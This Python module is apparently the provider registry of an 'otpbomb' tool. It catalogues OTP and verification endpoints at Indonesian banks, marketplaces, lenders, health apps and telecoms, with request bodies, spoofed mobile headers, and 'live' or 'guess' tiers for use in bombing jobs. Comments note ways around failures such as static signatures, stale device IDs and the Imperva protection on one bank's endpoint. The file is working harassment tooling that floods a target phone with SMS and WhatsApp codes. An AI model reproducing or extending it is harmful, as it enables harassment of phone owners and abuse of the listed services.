"""Provider registry — OTP-trigger endpoints.

Two tiers:

  tier="live"   probed from this host and answered non-404 on the wire (JSON
                error bodies count: the route exists and the phone reaches the
                backend). Payloads tuned for the ones that were decoded.
  tier="guess"  hand-written from brand shape; may 404. Bring your own with
                --providers-file or regenerate with `python3 -m otpbomb.discover`.

Fields per entry (JSON-serialisable, also loadable via --providers-file):
  name, category (wa|sms), url, method, form, json_body, headers, pre_url,
  extract, success_codes, success_contains, fail_contains, tier, note

Run `probe --tier all` to re-rank before a job — endpoints rot fast.
"""
from __future__ import annotations

from dataclasses import dataclass, field

DEFAULT_SUCCESS = (200, 201, 202, 204)

UA = (
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
)

BASE_HEADERS = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua-mobile": "?1",
    "sec-fetch-site": "same-site",
    "user-agent": UA,
}


@dataclass
class Provider:
    name: str
    category: str
    url: str
    method: str = "POST"
    form: dict | None = None
    json_body: dict | None = None
    headers: dict = field(default_factory=dict)
    pre_url: str | None = None
    extract: dict = field(default_factory=dict)
    success_codes: tuple = DEFAULT_SUCCESS
    success_contains: tuple = ()
    fail_contains: tuple = ()
    tier: str = "guess"
    note: str = ""

    @classmethod
    def from_dict(cls, d: dict) -> "Provider":
        known = {f for f in cls.__dataclass_fields__}  # type: ignore[attr-defined]
        kwargs = {k: v for k, v in d.items() if k in known}
        for key in ("success_codes", "success_contains", "fail_contains"):
            if key in kwargs and isinstance(kwargs[key], list):
                kwargs[key] = tuple(kwargs[key])
        kwargs.setdefault("name", "unnamed")
        kwargs.setdefault("category", "sms")
        kwargs.setdefault("url", "")
        return cls(**kwargs)

    def merged_headers(self) -> dict:
        h = dict(BASE_HEADERS)
        if "://" in self.url:
            origin = "/".join(self.url.split("/")[:3])
            h["origin"] = origin
            h["referer"] = origin + "/"
        if self.json_body is not None:
            h["content-type"] = "application/json"
        h.update(self.headers)
        return h


def _p(name, category, url, tier="guess", **kw) -> Provider:
    return Provider(name=name, category=category, url=url, tier=tier, **kw)


# ==========================================================================
# LIVE — probed, route resolves
# ==========================================================================
LIVE = [
    _p("redbus", "wa", "https://m.redbus.id/api/getOtp?number={local}&cc=62&whatsAppOpted=True",
       "live", method="GET",
       success_contains=("OTP Sent", '"Code":"200"'),
       note="KONFIRMASI kirim: 'OTP Sent Successfully'; channel WA via whatsAppOpted"),
    _p("cairin", "sms", "https://app.cairin.id/v1/app/sms/sendCaptcha", "live",
       form={"haveImageCode": "0", "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
             "phone": "{local}", "imageCode": "0", "userImei": "000000000000000",
             "type": "registry", "verifySend": "1"},
       success_codes=(200,),
       success_contains=("30101", "user have registered"),
       fail_contains=("20002",),
       note="tanpa userImei valid → 20002 missing parameter"),
    _p("harus", "sms",
       "https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code", "live",
       form={"data": '{"mobile": "{digits}", "noise": "{uuid}", "request_time": "{ts}", '
                     '"access_token": "11111"}'},
       headers={"origin": "https://h5.rupiahcepatweb.com",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
       success_codes=(200,),
       fail_contains=("400115", "400119", "Data salah"),
       note="nomor TANPA 0; body JSON-di-dalam-form; 400115 = token/flow invalid"),
    _p("icq", "sms", "https://u.icq.net/api/v14/rapi/auth/sendCode", "live",
       json_body={"reqId": "{rand16}", "params": {"phone": "{e164}", "language": "en-US",
                                                 "route": "sms", "devId": "ic1rtwz1s1Hj1O0r",
                                                 "application": "icq"}},
       headers={"origin": "http://web.icq.com", "referer": "http://web.icq.com/"},
       fail_contains=("Bad request", "40000"),
       note="balas 40000 Bad request kalau devId basi"),
    _p("pinjamindo", "sms",
       "https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code"
       "?mobile={digits}&af_id=1603255661130-6766273395770306663&app=pinjamindo&language=vivo"
       "&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215",
       "live", method="GET",
       success_codes=(200,), fail_contains=("sign error",),
       note="sign static; berubah bila param diubah"),
    _p("danacita", "sms", "https://api.danacita.co.id/users/send_otp/?mobile_phone={local}", "live",
       method="GET", success_codes=(200, 201, 202),
       note="401 tanpa header Authorization"),
    _p("matahari", "sms",
       "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "live",
       json_body={"otp_request": {"mobile_number": "{local}", "mobile_country_code": "+62"}},
       headers={"x-requested-with": "XMLHttpRequest"},
       success_codes=(200, 201)),
    _p("bni", "sms", "https://www.bni.co.id/id-id/api/otp/send", "live",
       form={"msisdn": "{local}"}, note="di belakang Imperva"),
    _p("bri", "sms", "https://www.bri.co.id/api/v1/otp/send", "live",
       form={"msisdn": "{local}", "channel": "sms"}),
    _p("byu", "sms", "https://www.byu.id/api/otp/send", "live",
       form={"phone": "{local}", "channel": "sms"}, fail_contains=("Request Rejected",)),
    _p("danamon", "sms", "https://www.danamon.co.id/api/otp/send", "live",
       form={"phone": "{local}", "channel": "sms"}, fail_contains=("Request Rejected",)),
    _p("permata", "sms", "https://www.permatabank.com/api/otp/send", "live",
       form={"phone": "{local}", "channel": "sms"}),
    _p("smartfren", "sms", "https://www.smartfren.com/api/otp/send", "live",
       form={"msisdn": "{local}", "channel": "sms"}),
    _p("harnic", "sms", "https://harnic.id/login/phone_auth_OTP", "live",
       form={"phone": "{local}"}),
    _p("harvestcake", "sms", "https://harvestcakes.com/register", "live",
       form={"phone": "{local}", "name": "otp", "email": "otp@mail.id"}),
    _p("thaifriendly", "sms", "https://www.thaifriendly.com/pl/index.php", "live",
       form={"z": "phonelogingetpin", "country": "62", "number": "{local}",
             "ppclienttoken": "igq39qdc9rwk2ax1zrgdq"}),
]

# ==========================================================================
# GUESS — hand-written, needs re-probe before trusting
# ==========================================================================
GUESS = [
    _p("gojek", "wa", "https://api.gojekapi.com/v5/customers",
       json_body={"email": "otp{ts}@mail.id", "name": "otp{rand16}", "phone": "{local}",
                  "signed_up_country": "ID"}),
    _p("gojek-otp", "wa", "https://api.gojekapi.com/v2/user/otp",
       json_body={"phone": "{e164}", "country_code": "+62", "method": "whatsapp"},
       headers={"x-app-version": "4.68.0", "x-user-type": "customer"}),
    _p("shopee", "wa", "https://shopee.co.id/api/v4/otp/send_vcode",
       json_body={"phone": "{digits}", "force_channel": "true", "operation": 7,
                  "channel": 2, "supported_channels": [1, 2, 3]},
       headers={"x-api-source": "rweb", "x-requested-with": "XMLHttpRequest"}),
    _p("shopee-v2", "wa", "https://shopee.co.id/api/v2/authentication/send_otp",
       form={"phone": "{digits}", "type": "sms"}),
    _p("tokopedia", "wa", "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
       form={"otp_type": "116", "msisdn": "{digits}", "tk": "", "email": "",
             "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"},
       headers={"origin": "https://accounts.tokopedia.com",
                "x-requested-with": "XMLHttpRequest"},
       note="butuh token tk dari /otp/c/page — pakai pre_url + extract"),
    _p("tokopedia-page", "wa",
       "https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={digits}", method="GET"),
    _p("lazada", "wa", "https://member.lazada.co.id/user/api/sendOtp",
       form={"phone": "{digits}"}, headers={"x-requested-with": "XMLHttpRequest"}),
    _p("blibli", "wa", "https://www.blibli.com/api/v1/otp/send",
       json_body={"phone": "{local}", "channel": "wa"}),
    _p("bukalapak", "wa", "https://m.bukalapak.com/api/otp/request",
       json_body={"phone": "{digits}", "channel": "whatsapp"}),
    _p("zalora", "wa", "https://www.zalora.co.id/api/v1/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("bibit", "wa", "https://api.bibit.id/v1/otp",
       json_body={"phone": "{local}", "channel": "whatsapp"}),
    _p("pintu", "wa", "https://api.pintu.co.id/v2/auth/otp",
       json_body={"phone": "{digits}", "channel": "WHATSAPP"}),
    _p("ajaib", "wa", "https://api.ajaib.co.id/v1/otp/send",
       json_body={"phoneNumber": "{digits}", "channel": "whatsapp"}),
    _p("pluang", "wa", "https://api.pluang.com/v1/otp/send",
       json_body={"phone": "{digits}", "channel": "wa"}),
    _p("bareksa", "wa", "https://api.bareksa.com/api/v1/otp/send",
       json_body={"phone": "{digits}"}, note="gateway minta Bearer token"),
    _p("kredivo", "wa", "https://api.kredivo.com/kredivo/v2/otp",
       json_body={"phone": "{digits}", "channel": "whatsapp"}),
    _p("tokocrypto", "wa", "https://www.tokocrypto.com/api/v1/otp/send",
       form={"phone": "{digits}", "channel": "whatsapp"}),
    _p("indodax", "wa", "https://indodax.com/api/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("halodoc", "wa", "https://api.halodoc.com/v1/otp",
       json_body={"phone": "{digits}", "channel": "WHATSAPP"}),
    _p("alodokter", "wa", "https://api.alodokter.com/v1/otp/send",
       json_body={"phone": "{digits}", "channel": "wa"}),
    _p("klikdokter", "wa", "https://api.klikdokter.com/v1/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("mamikos", "wa", "https://api.mamikos.com/v1/otp/send",
       json_body={"phone": "{digits}", "channel": "whatsapp"}),
    _p("ruangguru", "wa", "https://api.ruangguru.com/v1/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("orami", "wa", "https://api.orami.co.id/v1/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("pinhome", "wa", "https://api.pinhome.id/v1/otp/send",
       json_body={"phone": "{digits}", "channel": "whatsapp"}),
    _p("sayurbox", "wa", "https://api.sayurbox.com/v1/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("fore", "wa", "https://api.fore.coffee/v1/otp/send",
       json_body={"phone": "{digits}", "channel": "whatsapp"}),
    _p("sociolla", "wa", "https://api.sociolla.com/v1/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("jdid", "wa", "https://api.jd.id/v1/otp/send",
       form={"phone": "{digits}", "channel": "wa"}),
    _p("grab", "sms", "https://api.grab.com/grabid/v1/phone/otp",
       json_body={"phoneNumber": "{local}", "countryCode": "ID", "method": "SMS"},
       note="401 tanpa header x-grab-* asli"),
    _p("grab-wa", "wa", "https://api.grab.com/grabid/v1/phone/otp",
       json_body={"phoneNumber": "{local}", "countryCode": "ID", "method": "WA"}),
    _p("kredinesia", "sms", "https://api.kredinesia.id/v1/login/verificationCode",
       json_body={"phone": "{local}", "captcha": "", "type": "register"}),
    _p("misteraladin", "sms", "https://m.misteraladin.com/api/members/v2/otp/request",
       json_body={"phone_number_country_code": "62", "phone_number": "{local}",
                  "type": "register"}),
    _p("cmsapi", "sms", "https://cmsapi.mapclub.com/api/signup-otp",
       form={"phone": "{local}", "countryCode": "+62"}),
    _p("beryllium", "sms", "https://beryllium.mapclub.com/api/member/registration/sms/otp",
       form={"account": "{local}"}),
    _p("klikindomaret", "sms",
       "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={local}",
       method="GET"),
    _p("metroindonesia", "sms", "http://access.metroindonesia.com/Member/sendpin",
       form={"phoneno": "{local}"}),
    _p("carsome", "sms", "https://www.carsome.id/website/login/sendSMS",
       form={"username": "{local}", "optType": "1"}),
    _p("dekoruma", "wa",
       "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",
       json_body={"phoneNumber": "{local}", "platform": "wa"}),
    _p("sampingan", "sms", "https://srv3.sampingan.co.id/auth/generate-otp",
       json_body={"countryCode": "+62", "phoneNumber": "{local}"}),
    _p("trimegah", "sms", "https://sbn.trimegah.id/agent/register/sendOtp",
       form={"noHp": "{local}", "email": "otp{rand16}@mail.id"}),
    _p("danacepat", "sms", "https://battlefront.danacepat.com/v1/auth/common/phone/send-code",
       form={"mobile_no": "{local}"}),
    _p("tri", "sms", "https://registrasi.tri.co.id/daftar/generateOTP",
       form={"msisdn": "{local}"}),
    _p("smartfren2", "sms", "https://www.smartfren.com/id/api/otp",
       form={"msisdn": "{local}"}),
    _p("bi-fast", "sms", "https://www.bfi.co.id/api/otp/send",
       form={"phone": "{local}"}),
]

REGISTRY: list[Provider] = LIVE + GUESS


def by_name(name: str) -> Provider | None:
    for p in REGISTRY:
        if p.name == name:
            return p
    return None


def _tier_ok(p: Provider, tier: str) -> bool:
    if tier == "live":
        return p.tier == "live"
    if tier == "guess":
        return p.tier == "guess"
    return True


def select(only: list[str] | None = None, skip: list[str] | None = None,
           category: str = "all", tier: str = "live") -> list[Provider]:
    pool = [p for p in REGISTRY if _tier_ok(p, tier)]
    if category in ("wa", "sms"):
        pool = [p for p in pool if p.category == category]
    if only:
        wanted = {s.strip().lower() for s in only if s.strip()}
        names = {p.name for p in REGISTRY}
        unknown = wanted - names
        if unknown:
            raise KeyError(", ".join(sorted(unknown)))
        pool = [p for p in pool if p.name in wanted]
        if not pool:  # --only boleh menunjuk provider di luar tier terpilih
            pool = [p for p in REGISTRY if p.name in wanted]
    if skip:
        drop = {s.strip().lower() for s in skip if s.strip()}
        pool = [p for p in pool if p.name not in drop]
    return pool
